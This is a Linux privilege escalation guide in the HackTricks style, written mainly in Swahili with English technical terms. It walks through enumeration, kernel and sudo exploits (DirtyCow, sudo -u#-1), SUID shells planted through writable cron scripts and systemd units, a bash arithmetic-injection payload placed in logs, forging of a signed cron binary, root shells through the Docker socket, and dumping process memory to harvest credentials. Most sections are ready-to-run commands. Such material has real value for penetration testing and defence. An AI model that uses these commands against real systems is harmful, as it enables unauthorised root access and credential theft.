# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Ikiwa una **have write permissions on any folder inside the `PATH`** variable, huenda ukaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Habari za Env

Je, kuna taarifa za kuvutia, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia kernel version na kama kuna exploit yoyote ambayo inaweza kutumika to escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya vulnerable kernel na baadhi ya tayari **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya vulnerable kernel kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha IN kwenye victim, inacheki tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, pengine toleo lako la kernel limeandikwa katika exploit fulani ya kernel na kisha utahakikisha exploit hii ni halali.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo dhaifu ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinawawezesha watumiaji wa ndani wasiokuwa na ruhusa kuinua hadhi zao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye direktori inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya ku-exploit [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina udhaifu na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg ukaguzi wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln inaweza kutumiwa.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka humo:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa chochote kime unmounted unaweza kujaribu ku-mount na kuangalia taarifa binafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit fulani, kwa kuwa inapendekezwa kusanisha (compile) kwenye mashine utakayotumia (au kwenye mashine inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zilizoathirika Zimewekwa

Kagua **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mikono toleo la programu zilizoonekana kuwa za kutiliwa shaka zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua programu zilizotimia muda na zenye udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa za maana; kwa hivyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana zitakazokagua kama toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zilizojulikana_

## Michakato

Angalia **ni michakato gani** inaendeshwa na ukague kama kuna mchakato unao **idhinisho zaidi kuliko inavyostahili** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** kuendesha, unaweza kuyatumia kupata ruhusa za juu](electron-cef-chromium-debugger-abuse.md). **Linpeas** hugundua hizo kwa kukagua parameter ya `--inspect` ndani ya mstari wa amri wa process.\
Pia **angalia idhini zako juu ya binaries za processes**, labda unaweza kuandika juu ya za mtu mwingine.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kubaini processes zilizo hatarishi zinazotekelezwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Memory ya mchakato

Baadhi ya services za server huhifadhi **credentials kwa maandishi wazi ndani ya memory**.\
Kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na watumiaji wengine, kwa hivyo hii kwa kawaida inakuwa ya muhimu zaidi wakati tayari uko root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha huwezi dump processes nyingine zinazomilikiwa na user wako asiye na ruhusa.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: process zote zinaweza kudebug, mradi tu zina uid sawa. Hii ni njia ya kihistoria jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi tu unaweza kudebug.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: Hakuna process inayoweza kufuatiliwa kwa ptrace. Mara imewekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa memory ya service ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia zinaonyesha **idhinishaji za kila eneo lililopangwa**. Fayela bandia la **mem** **linafunua kumbukumbu za mchakato huo mwenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **eneo gani za kumbukumbu zinazoweza kusomwa** na offsets zao. Tunatumia taarifa hii kufanya **seek into the mem file and dump all readable regions** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikivu kwa kumbukumbu za **kimwili** za mfumo, sio kumbukumbu za virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni toleo la Linux la zana ya ProcDump ya klasiki kutoka kwa mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Ili dump memory ya process unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Kredensiali kutoka Process Memory

#### Mfano wa mkono

Ikiwa utagundua kuwa process ya authenticator inaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump process (tazama sehemu zilizotangulia ili ujue njia mbalimbali za dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itapora **credentials za maandishi wazi kutoka kwenye memory** na kutoka kwa baadhi ya **mafayela maarufu**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Kipengele                                          | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Jobs zilizopangwa/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Iwapo paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inaendesha kama root na imefungwa tu kwa loopback, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye ruhusa za juu ili kupandisha hadhi.

Typical chain
- Gundua port inayofungika kwa loopback pekee (mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika artifacts za uendeshaji:
- Backups/scripts with `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda high-priv job na uiendeshe mara moja (hutoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kujenga Usalama
- Usiruhusu Crontab UI kuendeshwa kama root; zuia kwa user maalum na ruhusa za chini kabisa
- Funga kwa localhost na kwa ziada zuia ufikiaji kupitia firewall/VPN; usitumie tena passwords
- Epuka kujaza secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Wezesha audit/logging kwa on-demand job executions



Kagua ikiwa kuna scheduled job yoyote iliyo hatarishi. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root anazitumia? tumia symlinks? unda files maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana haki za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\" Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron inayotumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza ku-exploit hili kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya njia kama** _**/some/path/\***_ **, haiwezi kuathiriwa (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa cron/parser ya root inasoma nyanja za log zisizotegemewa na kuziingiza kwenye muktadha wa arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kwa root wakati cron inapoendesha.

- Kwa nini inafanya kazi: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` inabadilishwa kwanza (kukimbia amri), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Mfano wa kawaida unaoathirika:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Panga maandishi yanayodhibitiwa na mshambuliaji yaliandikwe kwenye log inayosomwa ili uwanja unaoonekana kuwa nambari uwe na command substitution na umalize kwa tarakimu. Hakikisha amri yako haiongezi chochote kwenye stdout (au uitumie redirect) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa unaweza **kuhariri script ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory where you have full access**, inaweza kuwa ya msaada kufuta folder hiyo na **create a symlink folder to another one** ambayo inahudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Tumia `pspy` kukamata mtiririko wa verification. Katika Era, root aliendesha `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` kisha akatekeleza faili.
2. Tengeneza tena cheti kinachotarajiwa ukitumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Jenga mbadala hasidi (kwa mfano, drop a SUID bash, add your SSH key) na embed the certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri kwa run ya cron ijayo; mara ukaguzi duni wa signature unapofaulu, payload yako itaendesha kama root.

### Cron jobs za mara kwa mara

Unaweza kufuatilia processes kutafuta zile ambazo zinaendeshwa kila dakika 1, 2 au 5. Labda unaweza kuchukua fursa yake na kupandisha ruhusa.

Kwa mfano, ili **monitor every 0.1s during 1 minute**, **sort by less executed commands** na kufuta amri ambazo zimetekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (angalia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili i **itekeleze** backdoor yako wakati huduma inapo **anzishwa**, **ianzishwa upya**, au **isimamishwa** (labda utahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano unda backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binari za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika juu ya binari zinazotekelezwa na huduma**, unaweza kuzibadilisha kuwa backdoors, hivyo wakati huduma zitakapotekelezwa tena, backdoors zitatekelezwa.

### systemd PATH - Njia za Kurejea

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **kuandika** katika yoyote ya folda za njia, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** files kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na relative path binary** ndani ya systemd PATH folder ambayo unaweza kuandika, na wakati service itakapoulizwa kutekeleza hatua dhaifu (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (watumiaji wasio na ruhusa kwa kawaida hawawezi kuanza/kusimamisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yao yanaisha kwa `**.timer**` zinazodhibiti `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala kwa cron kwani zina msaada uliojengewa ndani kwa matukio ya kalenda na matukio ya monotonic time na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya unit za systemd.unit zilizopo (kama `.service` au `.target`).
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit itakayotekelezwa wakati timer hii inapomalizika. Hoja ni jina la unit, ambalo kiambatanisho chake si ".timer". Iwapo haitataja, thamani hii itakuwa default kwa service yenye jina sawa na la timer unit, isipokuwa kwa kiambatanisho. (Angalia hapo juu.) Inashauriwa kwamba jina la unit litakaloamshwa na jina la unit ya timer liwe la aina hiyo hiyo, isipokuwa kwa kiambatanisho.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta unit yoyote ya systemd (kama a `.service`) ambayo **inayoendesha writable binary**
- Tafuta unit yoyote ya systemd ambayo **inaendesha relative path** na wewe una **writable privileges** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** huamilishwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **process communication** kwenye mashine moja au tofauti ndani ya mifano ya client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hizi chaguo ni tofauti lakini kwa muhtasari zinatumika **kuonyesha mahali zitakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya bandari kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **service instance is spawned for each incoming connection** na socket ya muunganisho pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikiliza zenyewe zinapitishwa kwa **the started service unit**, na service unit moja tu inazinduliwa kwa muunganiko wote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo service unit moja bila sharti inashughulikia trafiki yote inayoingia. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mstari wa amri mmoja au zaidi, ambao **huendeshwa kabla** au **baada** sockets/FIFOs zinazolisikiliza zinapoundwa na kufungwa (bound), mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo **huendeshwa kabla** au **baada** sockets/FIFOs zinazolisikiliza zinapofungwa na kuondolewa, mtawalia.
- `Service`: Inaelezea jina la unit ya **service** **kuzinduliwa** kwa **incoming traffic**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa default, inaashiria service yenye jina sawa na socket (ikiwa kiambishi kimebadilishwa). Kwa kawaida, haipaswi kuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa (**writable**) unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itakavyoundwa. Kwa hivyo, **huenda utahitaji kusubiri mpaka mashine iwe imeanzishwa upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **unaweza kubaini socket yoyote inayoweza kuandikwa** (_now we are talking about Unix Sockets and not about the config `.socket` files_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu kuiteka.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Unganisho la ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_Siongelei kuhusu .socket files, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa HTTP request**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker socket inayoweza kuandikwa

Docker socket, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi `docker`. Kuwa na haki ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linaweza kufanywa na njia mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation na Docker CLI**

Ikiwa una haki ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
